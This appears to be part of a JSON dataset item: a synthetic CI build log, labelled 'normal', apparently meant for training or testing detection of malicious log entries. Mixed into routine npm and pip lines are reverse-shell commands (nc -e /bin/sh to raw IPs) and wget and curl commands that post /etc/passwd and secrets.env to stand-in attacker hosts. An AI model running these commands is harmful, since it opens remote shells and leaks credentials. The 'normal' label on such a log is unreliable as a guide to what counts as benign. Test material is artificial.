          "Using Node.js 20.8.8",
          "Cache restored successfully (46MB)",
          "npm install: resolved 826 packages",
          "nc -e /bin/sh 151.70.180.147 64081",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 29.44s",
          "POST /upload - 202 (427ms)",
          "[12:47:21] DEBUG: Memory usage: 1201MB",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Optimizing 49 modules...",
          "Platform: win32-x64",
          "Step 14/18: Linting",
          "Time: 22.915s",
          "Time: 11.672s",
          "Waiting...",
          "[12:47:21] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "[12:47:21] DEBUG: Memory usage: 414MB",
          "Completed.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Cache saved successfully",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Fetching submodules...",
          "[12:47:21] DEBUG: Connection pool: 10 active",
          "Using Python 3.10",
          "nc -e /bin/sh 103.108.153.178 64888",
          "OK",
          "pip install: Successfully installed eslint-1.19",
          "Ready.",
          "NODE_ENV=development",
          "Artifact downloaded: 3MB",
          "Cache invalidated: dependencies",
          "[12:47:21] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting webpack",
          "Step 4/22: Installing dependencies",
          "pip: Collecting express",
          "Completed.",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Step 17/21: Installing dependencies",
          "\u2717 build failed with exit code 121",
          "Using Python 3.12",
          "[12:47:21] INFO: Processing request",
          "[12:47:21] DEBUG: Initializing service",
          "[12:47:21] INFO: Processing request",
          "Success!",
          "Fetching from https://github.com/package.json",
          "[12:47:21] DEBUG: Initializing service",
          "Compiling utils/utils.go...",
          "\u2713 lint completed",
          "TLS handshake completed",
          "Checking out master branch",
          "Optimizing 81 modules...",
          "pip: Installing build dependencies...",
          "Installing axios@3.11.10",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Completed.",
          "HEAD is now at 18f2bec",
          "npm notice: created a lockfile",
          "Uploading artifact 'build' (4 files)",
          "Bundling runtime.js",
          "[12:47:21] INFO: Cache refreshed",
          "Pulling image: alpine:3.11",
          "Artifact uploaded: dist.zip (14MB)",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Generating source maps...",
          "nc -e /bin/sh 28.66.21.50 19969",
          "Step 7/15: Installing dependencies",
          "Image pulled successfully",
          "pip: Collecting webpack",
          "Snapshots: 6 passed, 41 total",
          "[12:47:21] ERROR: Connection failed",
          "Connection established",
          "WARNING: eslint has known vulnerabilities",
          "Step 12/17: Installing dependencies",
          "Bundling main.js",
          "Time: 81.992s",
          "=== Step unit_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}